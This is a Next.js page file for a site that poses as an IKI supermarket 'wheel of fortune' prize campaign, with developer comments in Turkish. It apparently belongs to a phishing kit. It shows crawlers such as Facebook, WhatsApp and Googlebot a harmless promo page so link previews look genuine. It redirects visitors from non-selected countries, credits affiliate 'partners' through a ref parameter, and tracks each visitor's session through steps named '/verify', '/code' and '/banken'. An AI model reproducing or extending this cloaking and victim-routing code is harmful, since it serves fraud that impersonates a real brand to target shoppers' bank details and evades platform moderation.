import { redirect } from "next/navigation";
import { headers } from "next/headers";
import { createSessionAction } from "@/app/actions/create-session";
import { buildShareMetadata, getCampaignNameServer } from "@/lib/share-metadata";
import { brandify } from "@/lib/brand";
import { createServerSupabaseClient } from "@/lib/supabase/server";
import { stepToPath } from "@/lib/session-routes";
import { getBlockedRedirectUrl } from "@/lib/geo-guard";
import { findResumableSession } from "@/lib/session-resume";

const ALLOWED_ENTRY_PAGES = ["/win", "/verify", "/wheel", "/code", "/banken"];

async function getEntryPage(): Promise<string> {
  try {
    const supabase = await createServerSupabaseClient();
    if (!supabase) return "/win";
    const { data } = await supabase
      .from("global_settings")
      .select("entry_page")
      .limit(1)
      .maybeSingle();
    const raw = typeof data?.entry_page === "string" ? data.entry_page.trim() : "";
    return ALLOWED_ENTRY_PAGES.includes(raw) ? raw : "/win";
  } catch {
    return "/win";
  }
}

export const dynamic = "force-dynamic";

export async function generateMetadata() {
  return buildShareMetadata({
    title: "IKI — Laimės Ratas",
    description:
      "IKI specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
    canonical: "/",
  });
}

type Props = {
  searchParams?: Promise<{ ref?: string }>;
};

const BOT_UA =
  /facebookexternalhit|facebot|twitterbot|whatsapp|telegrambot|linkedinbot|discordbot|slackbot|pinterest|redditbot|skypeuripreview|viber|vkshare|applebot|googlebot|bingbot|duckduckbot|baiduspider|yandex/i;

export default async function Home({ searchParams }: Props) {
  // Sosyal medya onizleme botlari icin: redirect/session OLUSTURMA,
  // direkt bu sayfanin metadata'si (og:image vb.) ile basit HTML dondur.
  // Boylece crawler ilk istekte og etiketlerini gorur ve DB'ye bos session yazilmaz.
  try {
    const h = await headers();
    const ua = h.get("user-agent") || "";
    if (BOT_UA.test(ua)) {
      const campaign = await getCampaignNameServer();
      return (
        <main>
          <h1>{brandify("IKI — Laimės Ratas", campaign)}</h1>
          <p>
            {brandify(
              "IKI specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
              campaign,
            )}
          </p>
        </main>
      );
    }
  } catch {
    // headers() erisilemezse normal akis
  }

  // Geo filtre: secili olmayan ulkeden gelen ziyaretci yonlendirme URL'sine gider.
  // Bot/crawler UA'lari getBlockedRedirectUrl icinde muaf tutulur (OG bozulmaz).
  {
    const h = await headers();
    const blockedUrl = await getBlockedRedirectUrl(h.get("user-agent") || "");
    if (blockedUrl) redirect(blockedUrl);
  }

  let partnerName = "admin";
  try {
    const sp = await searchParams;
    if (sp?.ref && typeof sp.ref === "string" && sp.ref.trim() !== "") {
      partnerName = sp.ref.trim();
    }
  } catch {
    partnerName = "admin";
  }

  // Mevcut session varsa yeni log olusturma -> kaldigi adima geri don.
  // Ref'li (olusturulan) linkte IP resume kapali: ayni IP'den farkli kisiler
  // linki acarsa birbirinin session'ina dusmesin; ayni cihaz cookie ile devam eder.
  const hasRef = partnerName !== "admin";
  const resumed = await findResumableSession(!hasRef);
  if (resumed) {
    const routeId =
      resumed.public_id != null && String(resumed.public_id).trim() !== ""
        ? String(resumed.public_id)
        : resumed.id;
    // Ref ile gelmisse son partneri guncelle (attribution taze kalsin)
    if (partnerName !== "admin") {
      try {
        const supabase = await createServerSupabaseClient();
        await supabase
          ?.from("sessions")
          .update({ partner_name: partnerName })
          .eq("id", resumed.id);
      } catch {
        /* sessiz */
      }
    }
    redirect(stepToPath(resumed.current_step as any, resumed.id, routeId));
  }

  const result = await createSessionAction(partnerName);

  if (!result.success || !result.data?.id) {
    redirect("/win");
  }

  const sessionId = result.data.id;
  const hasShortPublicId =
    result.data.public_id != null &&
    String(result.data.public_id).trim() !== "";

  const routeSessionId = hasShortPublicId
    ? String(result.data.public_id)
    : sessionId;

  const entryPage = await getEntryPage();
  redirect(`${entryPage}?session=${encodeURIComponent(routeSessionId)}`);
}
